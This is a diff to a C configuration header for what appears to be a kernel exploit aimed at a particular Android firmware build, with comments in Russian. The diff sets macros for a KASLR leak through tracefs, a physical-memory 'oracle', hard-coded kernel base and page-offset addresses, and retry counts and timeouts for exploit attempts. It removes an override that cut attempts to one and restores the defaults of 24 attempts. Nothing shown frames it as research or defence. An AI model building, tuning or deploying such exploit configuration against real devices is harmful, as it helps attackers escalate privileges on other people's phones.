@@ -4,7 +4,7 @@
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define BUILD_VARIANT_LABEL \
   "r12s-S721BXXSCDZF3-app-production-slide8-fops8"
-#define APP_PHYS_P0_ORACLE 1          // Оставляем включённым для совместимости
+#define APP_PHYS_P0_ORACLE 1
 #define APP_REQUIRE_FRESH_P0_SESSION 1
 #define APP_FOPS_DATA_ALIAS_DIAG_ONLY 1
 #define APP_FOPS_DATA_ALIAS_GATE_VERIFY 1
@@ -36,21 +36,20 @@
 // ============================================================
 #define APP_TRACEFS_KASLR_DIRECT 1
 
-// Недостающий макрос для slide_app.c (значение из успешного лога)
+// Недостающий макрос для slide_app.c
 #define SLIDE_PSELECT_NFDS 320
 
-// Уменьшаем количество попыток до 1 и сокращаем таймауты
-#undef DEFAULT_EXPLOIT_ATTEMPTS
-#undef DEFAULT_ATTEMPT_TIMEOUT_SEC
-#undef DEFAULT_P0_ATTEMPT_TIMEOUT_SEC
-#define DEFAULT_EXPLOIT_ATTEMPTS 1
-#define DEFAULT_ATTEMPT_TIMEOUT_SEC 45
-#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 10
-
 // ============================================================
-// Все остальные параметры — из твоего оригинального профиля
+// НЕ переопределяем DEFAULT_EXPLOIT_ATTEMPTS, DEFAULT_ATTEMPT_TIMEOUT_SEC, DEFAULT_P0_ATTEMPT_TIMEOUT_SEC
+// Используем стандартные значения из src/preload.c:
+//   DEFAULT_EXPLOIT_ATTEMPTS = 24
+//   DEFAULT_ATTEMPT_TIMEOUT_SEC = 90
+//   DEFAULT_P0_ATTEMPT_TIMEOUT_SEC = 20
 // ============================================================
 
+// ============================================================
+// Остальные параметры — из оригинального профиля
+// ============================================================
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
